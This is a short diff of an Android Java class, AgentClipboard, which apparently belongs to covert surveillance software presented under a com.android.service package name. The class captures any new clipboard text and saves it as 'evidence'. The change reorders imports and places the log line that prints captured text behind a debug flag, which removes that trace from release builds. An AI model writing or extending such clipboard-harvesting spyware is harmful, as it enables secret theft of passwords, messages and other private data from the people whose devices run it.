@@ -10,21 +10,20 @@
 package com.android.service.agent;
 
 import java.util.ArrayList;
-import java.util.Date;
-
-import com.android.service.LogR;
-import com.android.service.Status;
-import com.android.service.evidence.Evidence;
-import com.android.service.evidence.EvidenceType;
-import com.android.service.util.Check;
-import com.android.service.util.DataBuffer;
-import com.android.service.util.DateTime;
-import com.android.service.util.Utils;
-import com.android.service.util.WChar;
 
 import android.content.Context;
 import android.text.ClipboardManager;
 import android.util.Log;
+
+import com.android.service.LogR;
+import com.android.service.Status;
+import com.android.service.auto.Cfg;
+import com.android.service.evidence.Evidence;
+import com.android.service.evidence.EvidenceType;
+import com.android.service.util.Check;
+import com.android.service.util.DateTime;
+import com.android.service.util.Utils;
+import com.android.service.util.WChar;
 
 public class AgentClipboard extends AgentBase {
 	private static final String TAG = "AgentClipboard";
@@ -43,7 +42,7 @@ public class AgentClipboard extends AgentBase {
 
 		String ret = clipboardManager.getText().toString();
 		if (ret != null && !ret.equals(lastClip)) {
-			Log.d("QZ", TAG + " (go): captured " + ret);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): captured " + ret);
 			saveEvidence(ret);
 			lastClip = ret;
 		}
